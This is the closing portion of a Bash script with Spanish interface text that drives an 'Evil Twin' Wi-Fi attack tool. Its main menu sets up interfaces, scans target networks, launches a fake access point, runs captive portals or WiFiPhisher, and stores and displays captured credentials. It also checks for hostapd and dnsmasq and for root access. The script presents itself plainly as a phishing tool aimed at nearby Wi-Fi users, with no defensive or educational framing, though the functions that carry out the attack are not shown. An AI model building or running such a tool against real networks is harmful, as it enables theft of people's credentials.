        echo -e "  📄 $rel_path ($size)"
    done
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}1.${NC}  🔧 Configurar Interfaces                                       ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}2.${NC}  🔍 Escanear Redes Objetivo                                    ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}3.${NC}  🏠 AP Falso Simple                                             ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}4.${NC}  🕳️ Captive Portal Básico                                       ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}5.${NC}  🎣 WiFiPhisher Automático                                      ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}6.${NC}  🔑 Portal de Captura de Credenciales                          ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}7.${NC}  📊 Ver Credenciales Capturadas                                ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}8.${NC}  📈 Ver Resumen de Resultados                                   ${BLUE}║${NC}"
        echo -e "${BLUE}║${NC} ${CYAN}0.${NC}  🚪 Salir                                                        ${BLUE}║${NC}"
        echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        
        if [[ -n "$INTERFACE" ]]; then
            echo -e "\n${GREEN}📡 Interface WiFi: $INTERFACE${NC}"
        fi
        
        if [[ -n "$INTERNET_INTERFACE" ]]; then
            echo -e "${GREEN}🌐 Interface Internet: $INTERNET_INTERFACE${NC}"
        fi
        
        if [[ -n "$FAKE_AP_NAME" ]]; then
            echo -e "${GREEN}🎯 AP Objetivo: $FAKE_AP_NAME${NC}"
        fi
        
        echo ""
        read -p "Selecciona una opción (0-8): " choice
        
        case $choice in
            1) check_interfaces ;;
            2) 
                [[ -z "$INTERFACE" ]] && check_interfaces
                scan_target_networks
                read -p "Presiona Enter para continuar..."
                ;;
            3)
                [[ -z "$INTERFACE" ]] && check_interfaces
                [[ -z "$FAKE_AP_NAME" ]] && scan_target_networks
                ATTACK_TYPE="simple_ap"
                setup_output_directory
                execute_simple_ap
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                [[ -z "$INTERFACE" ]] && check_interfaces
                [[ -z "$FAKE_AP_NAME" ]] && scan_target_networks
                ATTACK_TYPE="captive_portal"
                select_portal_template
                setup_output_directory
                execute_captive_portal
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            5)
                [[ -z "$INTERFACE" ]] && check_interfaces
                ATTACK_TYPE="wifiphisher"
                setup_output_directory
                execute_wifiphisher
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            6)
                [[ -z "$INTERFACE" ]] && check_interfaces
                [[ -z "$FAKE_AP_NAME" ]] && scan_target_networks
                ATTACK_TYPE="credential_portal"
                select_credential_template
                setup_output_directory
                create_portal_template
                execute_captive_portal
                show_attack_summary
                read -p "Presiona Enter para continuar..."
                ;;
            7)
                if [[ -f "$OUTPUT_DIR/credentials/captured_data.txt" ]]; then
                    echo -e "${GREEN}🔍 Credenciales capturadas:${NC}"
                    cat "$OUTPUT_DIR/credentials/captured_data.txt"
                else
                    echo -e "${YELLOW}📭 No hay credenciales capturadas${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            8)
                if [[ -n "$OUTPUT_DIR" ]]; then
                    show_attack_summary
                else
                    echo -e "${YELLOW}⚠️ No hay resultados para mostrar${NC}"
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            0)
                echo -e "${GREEN}👋 ¡Hasta luego!${NC}"
                cleanup_processes
                exit 0
                ;;
            *)
                echo -e "${RED}❌ Opción inválida${NC}"
                sleep 1
                ;;
        esac
    done
}

# Verificar herramientas necesarias
missing_tools=()
for tool in hostapd dnsmasq; do
    if ! command -v "$tool" &> /dev/null; then
        missing_tools+=("$tool")
    fi
done

if [[ ${#missing_tools[@]} -gt 0 ]]; then
    echo -e "${RED}❌ Herramientas faltantes: ${missing_tools[*]}${NC}"
    echo -e "${YELLOW}💡 Instala con: sudo apt install hostapd dnsmasq${NC}"
    exit 1
fi

# Verificar permisos de root
if [[ $EUID -ne 0 ]]; then
    echo -e "${YELLOW}⚠️ Se requieren permisos de root para Evil Twin${NC}"
    echo -e "${CYAN}💡 Ejecuta como: sudo $0${NC}"
    read -p "¿Continuar de todos modos? (y/N): " continue_anyway
    [[ $continue_anyway != [yY] ]] && exit 1
fi

# Configurar trap para limpieza al salir
trap cleanup_processes EXIT

# Ejecutar menú principal
main_menu